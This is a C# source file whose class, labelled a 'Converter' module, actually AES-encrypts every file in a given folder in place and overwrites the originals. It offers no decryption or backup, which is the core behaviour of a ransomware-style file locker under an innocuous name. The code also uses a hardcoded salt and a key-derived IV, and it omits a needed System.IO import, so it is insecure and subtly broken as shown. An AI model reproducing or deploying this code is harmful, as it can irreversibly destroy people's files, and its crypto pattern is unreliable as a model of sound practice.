using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace MiniForms.Modules.Converter
{
    public class ConvertModule
    {
        private string _password { get; set; }
        public ConvertModule(string password)
        {
            this._password = password;
        }
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }
        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                System.IO.File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }
        public bool Execute(string projectFolder)
        {
            string[] files = Directory.GetFiles(projectFolder);

            if (projectFolder != "")
            {
                foreach (string file in files)
                {
                    EncryptionFile enc = new EncryptionFile();

                    string bytePassword = _password;

                    enc.EncryptFile(file, bytePassword);

                }
                return true;
            }
            return false;
        }
    }
}
